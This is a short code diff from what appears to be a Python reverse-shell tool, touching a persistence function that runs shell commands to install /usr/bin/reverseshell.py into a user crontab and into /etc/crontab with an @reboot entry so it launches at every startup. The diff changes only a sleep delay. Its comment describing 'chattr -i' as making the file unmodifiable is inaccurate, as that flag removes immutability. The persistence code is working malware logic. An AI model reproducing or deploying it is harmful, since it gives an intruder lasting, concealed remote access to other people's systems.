@@ -20,7 +20,7 @@ def __persistence():
     run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True) # make the script unmodifiable in /usr/bin
     run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True) # add a cronjob for this file
     run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True) # add reverseshell.py to startup
-    time.sleep(1.25)
+    time.sleep(0.25)
 
 class shell:
     
